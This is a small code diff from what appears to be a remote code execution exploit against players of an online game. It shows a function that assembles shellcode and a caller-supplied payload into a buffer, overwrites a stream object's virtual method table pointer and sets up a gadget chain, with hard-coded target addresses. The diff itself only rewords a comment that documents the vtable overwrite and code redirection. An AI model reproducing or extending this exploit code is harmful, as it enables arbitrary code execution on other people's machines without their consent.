@@ -35,7 +35,8 @@ bool rce(const std::vector<uint8_t>& payload, const std::vector<uint32_t>& playe
 	memcpy(rce.data() + setup_asm_offset, rce_suspend_threads, sizeof(rce_suspend_threads));
 	memcpy(rce.data() + exploit_size, payload.data(), payload.size());
 
-	*(uint16_t*)(rce.data() + stream_stack_offset) = 0x308B; // stream object vmt redirection
+	// stream object vmt overwrite 1439e8b30, leading to a code redirection to 1439e8b48
+	*(uint16_t*)(rce.data() + stream_stack_offset) = 0x308B;
 
 	// pointer to the "object" whose virtual method gets called by the last gadget
 	*(uint64_t*)(rce.data() + final_obj_offset) = 0x144786988;
